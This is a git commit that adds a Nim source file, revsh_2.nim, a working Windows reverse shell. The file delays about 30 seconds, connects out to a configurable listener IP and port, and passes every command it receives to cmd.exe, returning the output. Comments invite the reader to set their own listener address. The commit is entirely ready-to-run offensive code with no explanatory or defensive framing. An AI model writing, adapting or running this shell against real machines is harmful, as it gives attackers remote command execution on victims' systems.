5f688dda962f5ee87a56ebfdb45da10dc68a9c74
Daniel Lowrie <dlowrie290@yahoo.com>
2022-07-01 09:01:39 -0400

    Add files via upload

---
+++ revsh_2.nim
@@ -0,0 +1,21 @@
+import net, osproc, strformat, times
+
+let now1 = now() + 30.seconds # <-- Modify the amount of sleep time if desired
+var i = 1
+
+while now() <= now1:
+  var i = i + 1
+
+let
+  ip = "192.168.1.79" # <-- Change this to your listener's IP
+  port = 443          # <-- Change this to your listener's PORT
+  sock = newSocket()
+
+sock.connect(ip, Port(port))
+
+let prompt = "Nim-Shell> "
+while true:
+  send(sock, prompt)
+  let bad = recvLine(sock)
+  let cmd = execProcess(fmt"cmd.exe /C " & bad)
+  send(sock, cmd)
